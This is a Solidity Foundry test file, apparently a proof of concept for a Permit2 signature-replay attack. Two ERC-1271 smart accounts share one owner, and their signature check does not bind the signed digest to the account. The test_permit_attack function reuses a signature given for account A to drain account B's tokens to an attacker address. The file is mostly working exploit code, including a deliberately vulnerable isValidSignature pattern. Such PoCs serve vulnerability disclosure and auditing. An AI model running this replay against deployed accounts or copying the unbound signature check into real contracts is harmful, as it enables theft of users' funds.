// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Permit2} from "lib/permit2/src/Permit2.sol";
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {IAllowanceTransfer} from "lib/permit2/src/interfaces/IAllowanceTransfer.sol";
import {ECDSA} from "lib/openzeppelin-contracts/contracts/utils/cryptography/ECDSA.sol";

contract GenericOwnedAccount {
    address owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function isValidSignature(bytes32 _digest, bytes memory _signature) public view returns (bytes4) {
        (address signer,) = ECDSA.tryRecover(_digest, _signature);
        return (signer == owner) ? bytes4(0x1626ba7e) : bytes4(0xffffffff);
    }
}

contract GenericPoc is Test {
    ERC20 erc20 = new ERC20("a", "a");
    Permit2 permit2 = new Permit2();
    GenericOwnedAccount acctA;
    GenericOwnedAccount acctB;

    address owner;
    uint256 privKey;
    address attacker = address(13371337);

    // sig + struct, keep here to persist between tests
    IAllowanceTransfer.PermitSingle permitSingle;
    bytes sig;

    bytes32 _PERMIT_SINGLE_TYPEHASH = keccak256(
        "PermitSingle(PermitDetails details,address spender,uint256 sigDeadline)PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"
    );
    bytes32 _PERMIT_DETAILS_TYPEHASH =
        keccak256("PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)");

    function setUp() public {
        (owner, privKey) = makeAddrAndKey("1");

        acctA = new GenericOwnedAccount(owner);
        acctB = new GenericOwnedAccount(owner);

        deal(address(erc20), address(acctA), 10 ether);
        deal(address(erc20), address(acctB), 10 ether);
    }

    // owner signs normal transfer from account A to attacker via permit2
    function test_permit_legit() public {
        // permit single for permit2
        permitSingle = IAllowanceTransfer.PermitSingle({
            details: IAllowanceTransfer.PermitDetails({
                token: address(erc20),
                amount: uint160(10 ether),
                expiration: type(uint48).max,
                nonce: 0
            }),
            spender: attacker,
            sigDeadline: type(uint256).max
        });

        // hashing/preparing data blob for permit2
        bytes32 permitHash = keccak256(
            abi.encode(
                keccak256("PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"),
                permitSingle.details
            )
        );
        bytes32 dataHash =
            keccak256(abi.encode(_PERMIT_SINGLE_TYPEHASH, permitHash, permitSingle.spender, permitSingle.sigDeadline));
        bytes32 hashedTypeData = keccak256(abi.encodePacked("\x19\x01", permit2.DOMAIN_SEPARATOR(), dataHash));

        // balances before legit transfers
        assertEq(erc20.balanceOf(attacker), 0 ether);
        assertEq(erc20.balanceOf(address(acctA)), 10 ether);

        // sign
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privKey, hashedTypeData);
        sig = abi.encodePacked(r, s, v);

        // token receiver calls permit with sigs
        vm.startPrank(address(acctA));
        erc20.approve(address(permit2), uint160(10 ether));
        vm.startPrank(address(acctB));
        erc20.approve(address(permit2), uint160(10 ether));

        vm.startPrank(attacker);
        permit2.permit(address(acctA), permitSingle, sig);

        // transfer and check transfers
        permit2.transferFrom(address(acctA), attacker, uint160(10 ether), address(erc20));
        assertEq(erc20.balanceOf(attacker), 10 ether);
        assertEq(erc20.balanceOf(address(acctA)), 0 ether);
        console2.log("test 1 pass");
    }

    function test_permit_attack() public {
        // attacker receives legit transfer from owner's account A
        test_permit_legit();

        // attacker replays sig to steal from owner's account B
        vm.startPrank(attacker);
        permit2.permit(address(acctB), permitSingle, sig);

        // check bal
        permit2.transferFrom(address(acctB), attacker, uint160(10 ether), address(erc20));
        assertEq(erc20.balanceOf(attacker), 20 ether);
        assertEq(erc20.balanceOf(address(acctA)), 0 ether);
        assertEq(erc20.balanceOf(address(acctB)), 0 ether);
        console2.log("test 2 pass");
    }
}
